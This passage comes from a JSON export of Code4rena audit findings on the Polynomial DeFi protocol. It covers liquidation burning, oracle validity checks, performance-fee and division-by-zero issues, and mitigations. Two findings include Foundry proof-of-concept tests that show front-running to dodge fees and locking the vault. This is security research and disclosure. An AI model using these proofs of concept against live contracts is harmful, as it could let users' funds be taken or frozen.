tokens.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L547-L550 ```solidity     function saveToken(address token, address receiver, uint256 amt) external requiresAuth {         require(token != address(SUSD));         ERC20(token).transfer(receiver, amt);     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice has sent 10000 USDC to the `LiquidityPool` contract. 2. The protocol team would like to return such 10000 USDC to Alice. 3. However, because the `LiquidityPool` contract does not have a function that is similar to the `KangarooVault.saveToken` function, such 10000 USDC are locked in the `LiquidityPool` contract and cannot be returned to Alice. 4. Alice loses such 10000 USDC.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `LiquidityPool` contract can be updated to add a function that is similar to the `KangarooVault.saveToken` function for saving any ERC20 tokens that are not sUSD from the `LiquidityPool` contract."}, {"title": "`Exchange._liquidate` function can cause liquidator to burn too much `powerPerp` tokens", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/226", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L333-L353 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L121-L144   # Vulnerability details  ## Impact When calling the following `Exchange._liquidate` function, `uint256 totalCollateralReturned = shortCollateral.liquidate(positionId, debtRepaying, msg.sender)` is executed.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L333-L353 ```solidity     function _liquidate(uint256 positionId, uint256 debtRepaying) internal {         uint256 maxDebtRepayment = shortCollateral.maxLiquidatableDebt(positionId);         require(maxDebtRepayment > 0);         if (debtRepaying > maxDebtRepayment) debtRepaying = maxDebtRepayment;          IShortToken.ShortPosition memory position = shortToken.shortPositions(positionId);          uint256 totalCollateralReturned = shortCollateral.liquidate(positionId, debtRepaying, msg.sender);          address user = shortToken.ownerOf(positionId);          uint256 finalPosition = position.shortAmount - debtRepaying;         uint256 finalCollateralAmount = position.collateralAmount - totalCollateralReturned;          shortToken.adjustPosition(positionId, user, position.collateral, finalPosition, finalCollateralAmount);          pool.liquidate(debtRepaying);         powerPerp.burn(msg.sender, debtRepaying);         ...     } ```  In the following `ShortCollateral.liquidate` function, when executing `uint256 collateralClaim = debt.mulDivDown(markPrice, collateralPrice)`, where `debt` is `debtRepaying`, `collateralClaim` can be high if `collateralPrice` has become much lower comparing to `markPrice`, such as due to a market sell-off that causes the collateral to be worth much less than before. In this case, `totalCollateralReturned` can be high as well, which can cause `totalCollateralReturned > userCollateral.amount` to be true. When such condition is true, `totalCollateralReturned = userCollateral.amount` is executed, and only `userCollateral.amount` is transferred to the liquidator after executing `ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned)`.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L121-L144 ```solidity     function liquidate(uint256 positionId, uint256 debt, address user)         external         override         onlyExchange         nonReentrant         returns (uint256 totalCollateralReturned)     {         UserCollateral storage userCollateral = userCollaterals[positionId];          bytes32 currencyKey = synthetixAdapter.getCurrencyKey(userCollateral.collateral);         Collateral memory coll = collaterals[currencyKey];          (uint256 markPrice,) = exchange.getMarkPrice();         (uint256 collateralPrice,) = synthetixAdapter.getAssetPrice(currencyKey);         uint256 collateralClaim = debt.mulDivDown(markPrice, collateralPrice);         uint256 liqBonus = collateralClaim.mulWadDown(coll.liqBonus);         totalCollateralReturned = liqBonus + collateralClaim;         if (totalCollateralReturned > userCollateral.amount) totalCollateralReturned = userCollateral.amount;         userCollateral.amount -= totalCollateralReturned;          ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned);         ...     } ```  Back in the `Exchange._liquidate` function, the liquidator burns `debtRepaying` `powerPerp` tokens after `powerPerp.burn(msg.sender, debtRepaying)` is executed. However, in this situation, the liquidator only receives `userCollateral.amount` collateral tokens that are less than the collateral token amount that should be equivalent to `debtRepaying` `powerPerp` tokens but this liquidator still burns `debtRepaying` `powerPerp` tokens. As a result, this liquidator loses the extra `powerPerp` tokens, which are burnt, that are equivalent to the difference between `debtRepaying` `powerPerp` tokens' equivalent collateral token amount and `userCollateral.amount` collateral tokens.  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `Exchange._liquidate` function with `debtRepaying` being 1000e18. 2. When the `ShortCollateral.liquidate` function is called, `totalCollateralReturned > userCollateral.amount` is true, and `userCollateral.amount` collateral tokens that are equivalent to 500e18 `powerPerp` tokens are transferred to Alice. 3. When `powerPerp.burn(msg.sender, debtRepaying)` is executed in the `Exchange._liquidate` function, Alice burns 1000e18 `powerPerp` tokens. 4. Because Alice only receives `userCollateral.amount` collateral tokens that are equivalent to 500e18 `powerPerp` tokens, she loses 500e18 `powerPerp` tokens.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `Exchange._liquidate` function can be updated to burn the number of `powerPerp` tokens that are equivalent to the actual collateral token amount received by the liquidator instead of burning `debtRepaying` `powerPerp` tokens."}, {"title": "`LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions should execute `require(!isInvalid && spotPrice > 0)` instead of `require(!isInvalid || spotPrice > 0)`", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/221", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L401-L420 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L556-L611 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L727-L735 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L764-L771 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L399-L401   # Vulnerability details  ## Impact The following `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions execute `require(!isInvalid && baseAssetPrice != 0)`, where `isInvalid` and `baseAssetPrice` are returned from calling `LIQUIDITY_POOL.baseAssetPrice()`. Because `LIQUIDITY_POOL.baseAssetPrice()` returns the return values of `perpMarket.assetPrice()`, the `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions would only consider `perpMarket.assetPrice()` as reliable when both `!isInvalid` and `baseAssetPrice != 0` are true.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L401-L420 ```solidity     function transferPerpMargin(int256 marginDelta) external requiresAuth nonReentrant {         if (marginDelta < 0) {             ...             (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();             require(!isInvalid && baseAssetPrice != 0);             ...         } else {             ...         }         ...     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L556-L611 ```solidity     function _openPosition(uint256 amt, uint256 minCost) internal {         ...         (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();         require(!isInvalid && baseAssetPrice != 0);         ...     } ```  However, the following `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions execute `require(!isInvalid || spotPrice > 0)` and would consider `perpMarket.assetPrice()` as reliable when either `!isInvalid` or `spotPrice > 0` is true. When `perpMarket.assetPrice()` returns a positive `spotPrice` and a true `isInvalid`, such `spotPrice` should be considered as invalid and untrusted; trades, such as these for opening and closing long and short positions using the `LiquidityPool`, that depend on the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions' return values, which then rely on such invalid `spotPrice`, should not be allowed. However, because `!isInvalid || spotPrice > 0` is true in this case, calling the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions will not revert, and such trades that should not be allowed can still be made.   https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L727-L735 ```solidity     function _getDelta() internal view returns (uint256 delta) {         (uint256 spotPrice, bool isInvalid) = baseAssetPrice();         uint256 pricingConstant = exchange.PRICING_CONSTANT();          require(!isInvalid || spotPrice > 0);          delta = spotPrice.mulDivDown(2e18, pricingConstant);         delta = delta.mulWadDown(exchange.normalizationFactor());     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L764-L771 ```solidity     function _calculateMargin(int256 size) internal view returns (uint256 margin) {         (uint256 spotPrice, bool isInvalid) = baseAssetPrice();          require(!isInvalid || spotPrice > 0);          uint256 absSize = size.abs();         margin = absSize.mulDivDown(spotPrice, futuresLeverage);     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L399-L401 ```solidity     function baseAssetPrice() public view override returns (uint256 spotPrice, bool isInvalid) {         (spotPrice, isInvalid) = perpMarket.assetPrice();     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Calling the `perpMarket.assetPrice` function returns a positive `spotPrice` and a true `isInvalid` at this moment. 2. Calling the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions would not revert because `require(!isInvalid || spotPrice > 0)` would be passed. 3. Trades, such as for closing a long position through calling the `LiquidityPool.closeLong` function, can go through even though the used `spotPrice` is invalid and untrusted. 4. In this case, such trades should not be allowed but are still made.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions can be updated to execute `require(!isInvalid && spotPrice > 0)` instead of `require(!isInvalid || spotPrice > 0)`."}, {"title": "Some functions that call `Exchange.getMarkPrice` function do not check if `Exchange.getMarkPrice` function's returned `markPrice` is 0", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/220", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L186-L202 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L399-L401 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L401-L420 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L556-L611 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L436-L447 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L404-L406   # Vulnerability details  ## Impact The following `Exchange.getMarkPrice` function uses `pool.baseAssetPrice()`'s returned `baseAssetPrice`, which is `spotPrice` returned by `perpMarket.assetPrice()`, to calculate and return the `markPrice`. When such `spotPrice` is 0, this function would return a 0 `markPrice`.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L186-L202 ```solidity     function getMarkPrice() public view override returns (uint256 markPrice, bool isInvalid) {         (uint256 baseAssetPrice, bool invalid) = pool.baseAssetPrice();         isInvalid = invalid;          (int256 fundingRate,) = getFundingRate();         fundingRate = fundingRate / 1 days;          int256 currentTimeStamp = int256(block.timestamp);         int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);          int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));         int256 normalizationUpdate = 1e18 - totalFunding;         uint256 newNormalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));          uint256 squarePrice = baseAssetPrice.mulDivDown(baseAssetPrice, PRICING_CONSTANT);         markPrice = squarePrice.mulWadDown(newNormalizationFactor);     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L399-L401 ```solidity     function baseAssetPrice() public view override returns (uint256 spotPrice, bool isInvalid) {         (spotPrice, isInvalid) = perpMarket.assetPrice();     } ```  As shown by the code below, calling the `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions would revert if `baseAssetPrice` returned by `LIQUIDITY_POOL.baseAssetPrice()` is 0 no matter what the returned `isInvalid` is. This means that the price returned by `perpMarket.assetPrice()` should not be trusted and used whenever such price is 0.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L401-L420 ```solidity     function transferPerpMargin(int256 marginDelta) external requiresAuth nonReentrant {         if (marginDelta < 0) {             ...             (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();             require(!isInvalid && baseAssetPrice != 0);             ...         } else {             ...         }         ...     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L556-L611 ```solidity     function _openPosition(uint256 amt, uint256 minCost) internal {         ...         (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();         require(!isInvalid && baseAssetPrice != 0);         ...     } ```  However, some functions that call the `Exchange.getMarkPrice` function do not additionally check if the `Exchange.getMarkPrice` function's returned `markPrice` is 0, which can lead to unexpected consequences. For example, the following `KangarooVault.removeCollateral` function executes `(uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice()`. When `markPrice` is 0, which is caused by a 0 `spotPrice` returned by `perpMarket.assetPrice()`, such price should be considered as invalid and should not be used; yet, in this case, such 0 `markPrice` can cause `minColl` to also be 0, which then makes `require(positionData.totalCollateral >= minColl + collateralToRemove)` much more likely to be passed. In this situation, calling the `KangarooVault.removeCollateral` function can remove the specified `collateralToRemove` collateral from the Power Perp position but this actually should not be allowed because such 0 `spotPrice` and 0 `markPrice` should be considered as invalid and should not be used.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L436-L447 ```solidity     function removeCollateral(uint256 collateralToRemove) external requiresAuth nonReentrant {         (uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice();         uint256 minColl = positionData.shortAmount.mulWadDown(markPrice);         minColl = minColl.mulWadDown(collRatio);          require(positionData.totalCollateral >= minColl + collateralToRemove);          usedFunds -= collateralToRemove;         positionData.totalCollateral -= collateralToRemove;          emit RemoveCollateral(positionData.positionId, collateralToRemove);     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L404-L406 ```solidity     function getMarkPrice() public view override returns (uint256, bool) {         return exchange.getMarkPrice();     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. The `KangarooVault.removeCollateral` function is called with `collateralToRemove` being 100e18. 2. `markPrice` returned by `LIQUIDITY_POOL.getMarkPrice()` is 0 because a 0 `spotPrice` is returned by `perpMarket.assetPrice()`. 3. Due to the 0 `markPrice`, `minColl` is 0, and `positionData.totalCollateral >= minColl + collateralToRemove` can be true even if `positionData.totalCollateral` is also 100e18 at this moment. 4. Calling the `KangarooVault.removeCollateral` function does not revert, and 100e18 collateral is remove from the Power Perp position. 5. However, a 0 `spotPrice` returned by `perpMarket.assetPrice()` and a 0 `markPrice` returned by `LIQUIDITY_POOL.getMarkPrice()` should be considered as invalid and should not be used. In this case, removing 100e18 collateral from the Power Perp position should not be allowed or succeed but it does.  ## Tools Used VSCode  ## Recommended Mitigation Steps Functions, such as the `KangarooVault.removeCollateral` function, that call the `Exchange.getMarkPrice` function can be updated to additionally check if the `Exchange.getMarkPrice` function's returned `markPrice` is 0. If it is 0, calling these functions should revert."}, {"title": "`KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions should check `isInvalid`, which is returned by external perp market contract's `remainingMargin` function, and revert if such `isInvalid` is true", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/219", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L782-L797 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L591-L609 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L774-L778 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L341-L362 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L340-L365   # Vulnerability details  ## Impact The following `KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions call the external perp market contract's `remainingMargin` function to get the remaining margin for the `KangarooVault` or `LiquidityPool`. Yet, none of these functions use `isInvalid` that can be returned by such `remainingMargin` function. When the returned remaining margin is invalid, such value should not be trusted and used. Using such invalid remaining margin can have negative effects.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L782-L797 ```solidity     function _resetTrade() internal {         positionData.positionId = 0;         (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));         PERP_MARKET.transferMargin(-int256(totalMargin));         usedFunds -= totalMargin;         ...     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L591-L609 ```solidity     function rebalanceMargin(int256 marginDelta) external requiresAuth nonReentrant {         int256 currentPosition = _getTotalPerpPosition();         uint256 marginRequired = _calculateMargin(currentPosition);         (uint256 currentMargin,) = perpMarket.remainingMargin(address(this));          int256 additionalMargin = marginDelta;          if (currentMargin >= marginRequired) {             marginDelta -= int256(currentMargin - marginRequired);         } else {             marginDelta += int256(marginRequired - currentMargin);         }         ...     } ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L774-L778 ```solidity     function _getTotalMargin() internal view returns (uint256) {         (uint256 margin,) = perpMarket.remainingMargin(address(this));          return margin;     } ```  For example, we can compare the `KangarooVault.getTokenPrice` and `LiquidityPool.getTokenPrice` functions. The following `KangarooVault.getTokenPrice` function checks the `isInvalid` returned by `PERP_MARKET.remainingMargin(address(this))` so calling it will revert if `PERP_MARKET.remainingMargin(address(this))`'s returned `totalMargin` is invalid. In contrast, the `LiquidityPool.getTokenPrice` function does not do this.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L341-L362 ```solidity     function getTokenPrice() public view returns (uint256) {         ...         (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));         require(!isInvalid);         ...     } ```  In the following `LiquidityPool.getTokenPrice` function, when `_getTotalMargin()`'s returned `totalMargin`, which is also `margin` returned by `perpMarket.remainingMargin(address(this))` in the `LiquidityPool._getTotalMargin` function, is invalid, such `totalMargin` is still used to increase `totalValue`, which then affects the liquidity token's price. The `LiquidityPool.getTokenPrice` function is called in functions like `LiquidityPool.deposit` and `LiquidityPool.withdraw`. Thus, calling such functions would not revert when such invalid `totalMargin` is used. As a result, the depositing and withdrawal actions that should not be allowed because of such invalid `totalMargin` can still be allowed unexpectedly.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L340-L365 ```solidity     function getTokenPrice() public view override returns (uint256) {         if (totalFunds == 0) {             return 1e18;         }          uint256 totalSupply = liquidityToken.totalSupply() + totalQueuedWithdrawals;         int256 skew = _getSkew();          if (skew == 0) {             return totalFunds.divWadDown(totalSupply);         }          (uint256 markPrice, bool isInvalid) = getMarkPrice();         require(!isInvalid);          uint256 totalValue = totalFunds;          uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());         uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());         uint256 totalMargin = _getTotalMargin();          totalValue += totalMargin + amountToCollect;         totalValue -= uint256((int256(amountOwed) + usedFunds));          return totalValue.divWadDown(totalSupply);     } ```   ## Proof of Concept The following steps can occur for the described scenario. 1. The `LiquidityPool.deposit` function is called to deposit some sUSD tokens. 2. When the `LiquidityPool.getTokenPrice` function is called, `_getTotalMargin()`'s returned `totalMargin`, which is `margin` returned by `perpMarket.remainingMargin(address(this))`, is invalid. However, such invalid `totalMargin`  does not cause calling the `LiquidityPool.getTokenPrice` function to revert. 3. The deposit action succeeds while the used liquidity token's price that depends on the invalid `totalMargin` is inaccurate. Such deposit action should not be allowed but it is.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions can be updated to check `isInvalid` that is returned by the external perp market contract's `remainingMargin` function. If such `isInvalid` is true, calling these functions should revert."}, {"title": "Hedging during liquidation is incorrect", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/214", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L561 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L347-L350   # Vulnerability details  ## Impact Hedging will not work as expected, and LiquidityPool will lose funds without expectation. ## Proof of concept 1. When a short position is liquidated in contract Exchange, function `_liquidate` will be triggered. It will burn the power perp tokens and reduce the short position amount accordingly. ```solidity= function _liquidate(uint256 positionId, uint256 debtRepaying) internal {     ...     uint256 finalPosition = position.shortAmount - debtRepaying;     uint256 finalCollateralAmount = position.collateralAmount - totalCollateralReturned;          shortToken.adjustPosition(positionId, user, position.collateral, finalPosition, finalCollateralAmount);      pool.liquidate(debtRepaying);     powerPerp.burn(msg.sender, debtRepaying);      ... ``` 2. As you can see, it will decrease the size of short position by  `debtRepaying`, and burn `debtRepaying` power perp tokens. Because of the same amount, the skew of `LiquidityPool` will not change. 3. Howerver, `pool.liquidate` will be called, and `LiquidityPool` will be hedged with `debtRepaying` amount. ```solidity= function liquidate(uint256 amount) external override onlyExchange nonReentrant {     (uint256 markPrice, bool isInvalid) = getMarkPrice();     require(!isInvalid);      uint256 hedgingFees = _hedge(int256(amount), true);     usedFunds += int256(hedgingFees);      emit Liquidate(markPrice, amount); } ``` 4. Therefore, LiquidityPool will be hedged more than it needs, and the position of `LiquidityPool` in the Perp Market will be incorrect (compared with what it should be for hedging). ## Tool used  Manual Review  ## Recommended Mitigation Steps Should not hedge the LiquidityPool during liquidation. "}, {"title": "Uneven deduction of performance fee causes some KangarooVault users to lose part of their token value", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/161", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-05"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L791 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L359   # Vulnerability details   In `KangarooVault._resetTrade()`, a `performanceFee` is charged upon closing of all positions, on the `premiumCollected`. This is inconsistent with `getTokenPrice()` as `premiumCollected` is factored in the token price computation, while the `performanceFee` is not. This leads to an uneven distribution of the `performanceFee` for the `KangarooVault` users.  ## Impact That means a user can evade the `performanceFee` and steal some of the funds from the rest by triggering `processWithdraw()` before the `performanceFee` is deducted from `KangarooVault`. The remaining users will be shortchanged and lose part of their token value as they bear the charges from the performance fee.   ### Detailed Explanation  When all positions in `KangarooVault` are closed, `_resetTrade()` is triggered, which will proceed to deduct a `performanceFee` from the `premiumCollected`.      function _resetTrade() internal {         positionData.positionId = 0;         (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));         PERP_MARKET.transferMargin(-int256(totalMargin));         usedFunds -= totalMargin;          uint256 fees = positionData.premiumCollected.mulWadDown(performanceFee);         if (fees > 0) SUSD.safeTransfer(feeReceipient, fees);          totalFunds += positionData.premiumCollected - fees;         totalFunds -= usedFunds;          positionData.premiumCollected = 0;         positionData.totalMargin = 0;         usedFunds = 0;     }  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L788-L789   However, only `premiumCollected` is factored in the getTokenPrice() computation but not the `performanceFee`. That means the premiums are distributed among the users via token price, while the performance fee is not.      function getTokenPrice() public view returns (uint256) {         if (totalFunds == 0) {             return 1e18;         }          uint256 totalSupply = getTotalSupply();         if (positionData.positionId == 0) {             return totalFunds.divWadDown(totalSupply);         }          uint256 totalMargin;          (uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();         require(!isInvalid);         (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));         require(!isInvalid);          uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;         totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));          return totalValue.divWadDown(totalSupply);     }  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L358-L359  ## Proof of Concept Add the following imports and test case to `test/KangarooVault.t.sol`      import {IVaultToken} from \"../src/interfaces/IVaultToken.sol\";      function testKangarooPerformanceFee() public {         uint256 amt = 231e18;         IVaultToken vaultToken = IVaultToken(kangaroo.VAULT_TOKEN());          // deposit equal value for both user_2 and user 3 into KangarooVault         uint256 depositAmt = 10e18;         susd.mint(user_2, depositAmt);         vm.startPrank(user_2);         susd.approve(address(kangaroo), depositAmt);         kangaroo.initiateDeposit(user_2, depositAmt);         assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);         vm.stopPrank();          susd.mint(user_3, depositAmt);         vm.startPrank(user_3);         susd.approve(address(kangaroo), depositAmt);         kangaroo.initiateDeposit(user_3, depositAmt);         assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);         vm.stopPrank();          skip(14500);         kangaroo.processDepositQueue(2);           // Open position at KangarooVault and execute the orders         kangaroo.openPosition(amt, 0);         skip(100);         kangaroo.executePerpOrders(emptyData);         kangaroo.clearPendingOpenOrders(0);          // Simulate price drop to trigger profit from premium collection         setAssetPrice(initialPrice - 100e18);          // initiate withdrawal for both user_2 and user_3         vm.prank(user_2);         kangaroo.initiateWithdrawal(user_2, depositAmt);          vm.prank(user_3);         kangaroo.initiateWithdrawal(user_3, depositAmt);          skip(14500);          // close all position with gain from premium collection         kangaroo.closePosition(amt, 1000000e18);         skip(100);         kangaroo.executePerpOrders(emptyData);           // user_2 frontrun clearPendingCloseOrders() to withdraw at higher token price         kangaroo.processWithdrawalQueue(1);         assertEq(vaultToken.balanceOf(user_2), 0);         assertEq(susd.balanceOf(user_2), 9693821343146274141);          // This will trigger resetTrade and deduct performance Fee         kangaroo.clearPendingCloseOrders(0);            // user_3's withdrawal was processed but at a lower token price         kangaroo.processWithdrawalQueue(1);         assertEq(vaultToken.balanceOf(user_3), 0);         assertEq(susd.balanceOf(user_3),9655768088211372841);          // This shows that user_3 was shortchanged and lost part of token value,          // despite starting with equal token balance         assertGt(susd.balanceOf(user_2), susd.balanceOf(user_3));     }   ## Recommended Mitigation Steps  Consider changing the following in https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L359          totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) );  to           totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) + positionData.premiumCollected.mulWadDown(performanceFee));   "}, {"title": "Division by zero error causes KangarooVault to be DoS with funds locked inside", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/160", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L348   # Vulnerability details  `KangarooVault` can be DoS with funds locked in the contract due to a division by zero error in `getTokenPrice()` as it does not handle the scenario where `getTotalSupply()` is zero.   ## Impact Funds will be locked within the KangarooVault (as shown in the PoC below) and it is not able to recover from the DoS.  That is because, to recover from the DoS, it requires increasing total supply through minting of new tokens via deposits. However, that is not possible as `initiateDeposit()` relies on `getTokenPrice()`.  Also, we cannot withdraw the remaining funds as there are no more VaultTokens left to burn.     ### Detailed Explanation  `getTokenPrice()` will attempt to perform a division by `getTotalSupply()` when `totalFunds != 0` and `positionId == 0`. This scenario is possible when there are remaining funds in `KangarooVault` when all positions are closed and all vault token holders withdrawn their funds.      function getTokenPrice() public view returns (uint256) {         if (totalFunds == 0) {             return 1e18;         }          uint256 totalSupply = getTotalSupply();         if (positionData.positionId == 0) {             return totalFunds.divWadDown(totalSupply);         }    ## Proof of Concept  Add the following imports and test case to `test/Kangaroo.Vault.t.sol`      function testKangarooDivisionByZero() public {         uint256 amt = 231e18;          // Open position to decrease availableFunds for withdrawals.         kangaroo.openPosition(amt, 0);         skip(100);         kangaroo.executePerpOrders(emptyData);         kangaroo.clearPendingOpenOrders(0);          // initiate user withdrawal         // this will be a partial withdrawal due to the open position.         vm.prank(user_1);         kangaroo.initiateWithdrawal(user_1, 5e23);         kangaroo.processWithdrawalQueue(1);           // close all position         kangaroo.closePosition(amt, 1000000e18);         skip(100);         kangaroo.executePerpOrders(emptyData);         kangaroo.clearPendingCloseOrders(0);            // Complete remaining withdrawals of funds.         // this will reduce totalSupply to zero and later cause a division by zero error.         kangaroo.processWithdrawalQueue(1);          /// prepare for new deposit         vm.startPrank(user_1);         susd.approve(address(kangaroo), 5e23);          // This deposit will revert due to division by zero.         vm.expectRevert();         kangaroo.initiateDeposit(user_1, 5e23);         vm.stopPrank();           // KangarooVault is now DoS and some funds are locked in it         assertEq(susd.balanceOf(address(kangaroo)), 168969);     }   ## Recommended Mitigation Steps  Fix `getTokenPrice()` to handle the scenario when `totalSupply()` is zero."}, {"title": "LiquidityPool can be DoS when a complete withdrawal is performed", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/157", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L340-L365   # Vulnerability details   `LiquidityPool` can be DoS when all funds are withdrawn from the pool, causing `getTokenPrice()` to revert due to zero `totalSupply()`.  ## Impact The  `LiquidityPool` will not be able to proceed and requires new deployment of the contracts.   ### Detailed Explanation The `LiquidityPool.getTokenPrice()` will encounter a division by zero error when the `totalSupply` is zero but the `totalFunds` is non-zero. This could occur when there are 